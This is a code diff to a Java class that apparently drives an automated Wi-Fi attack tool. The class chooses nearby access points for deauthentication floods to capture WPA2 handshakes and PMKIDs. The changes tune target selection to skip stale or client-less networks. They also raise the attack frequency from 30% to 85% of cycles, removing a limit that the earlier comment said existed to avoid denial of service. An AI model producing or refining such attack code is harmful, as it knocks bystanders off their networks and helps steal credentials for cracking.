@@ -60,6 +60,7 @@ public class PwngBrain {
         int attempts = 0;
         int pmkidSuccess = 0;
         int handshakeSuccess = 0;
+        int noClientsCount = 0;  // consecutive "no clients" failures — skip if >= 3
         long lastSeen;
         long lastAttempt;
         boolean evilTwinWorked = false;
@@ -199,6 +200,21 @@ public class PwngBrain {
             return d;
         }
         
+        // Prune APs not seen in 120s — keeps DB fresh, prevents 5km-distant targets
+        long nowTs = System.currentTimeMillis();
+        Iterator<Map.Entry<String, ApKnowledge>> it = apDB.entrySet().iterator();
+        int pruned = 0;
+        while (it.hasNext()) {
+            ApKnowledge ap = it.next().getValue();
+            if (ap.lastSeen > 0 && nowTs - ap.lastSeen > 120_000) {
+                it.remove();
+                pruned++;
+            }
+        }
+        if (pruned > 0) {
+            android.util.Log.i("PwngBrain", "Pruned " + pruned + " stale APs from DB");
+        }
+        
         // Find best target using Thompson Sampling + signal strength bias
         // Sniff-deauth works best on close APs where we can hear both AP and client
         ApKnowledge best = null;
@@ -209,6 +225,13 @@ public class PwngBrain {
             if (ap.flags.contains("SAE")) continue;
             if (blacklistedSsids.contains(ap.ssid)) continue;
             if (ap.handshakeSuccess > 0) continue;  // already got this one
+            
+            // STALE CHECK: skip APs not seen recently (prevents targeting 5km-distant APs)
+            // lastSeen==0 means loaded from old brain.mem but never seen this session
+            if (ap.lastSeen == 0 || nowTs - ap.lastSeen > 60_000) continue;
+            
+            // NO CLIENTS: skip APs that had 3+ consecutive "no clients" failures
+            if (ap.noClientsCount >= 3) continue;
             
             // Signal-weighted Thompson sample
             // Strong signal = can hear both AP and client clearly
@@ -238,8 +261,9 @@ public class PwngBrain {
         }
         
         // Always use sniff_deauth — passive EAPOL capture after CSA deauth flood
-        // 30% deauth probability: only attack 30% of cycles to avoid DoS-ing the target
-        if (Math.random() > 0.30) {
+        // 85% attack rate: only skip occasional cycles to avoid saturating the interface
+        // (was 30% — way too conservative, deauth was effectively disabled 70% of time)
+        if (Math.random() > 0.85) {
             Decision d = new Decision("scan", "deauth flood protection — skipping attack cycle");
             d.face = "(◕‿‿◕)";
             d.status = "pacing... (" + currentApCount + " APs, " + currentWpa2Count + " WPA2)";
@@ -283,9 +307,17 @@ public class PwngBrain {
                     totalPmkids++;
                 }
             } else {
-                // Penalize only technical failures, not "no client nearby"
-                if (action.equals("sniff_deauth")) {
+                // "no_clients" = AP has no associated stations — don't waste time
+                boolean noClients = details != null && details.contains("no_clients");
+                if (noClients) {
+                    ap.noClientsCount++;
+                    ap.score -= 5;  // heavy penalty for empty APs
+                    // Don't blacklist permanently — clients may appear later
+                    // But skip for now: noClientsCount >= 3 filter in thinkAttack
+                    android.util.Log.i("PwngBrain", ap.ssid + " no clients x" + ap.noClientsCount);
+                } else if (action.equals("sniff_deauth")) {
                     ap.score -= 2;
+                    ap.noClientsCount = 0;  // reset — deauth failed but clients exist
                     if (ap.attempts >= 6 && ap.score < -10) {
                         blacklistedSsids.add(ap.ssid);
                     }
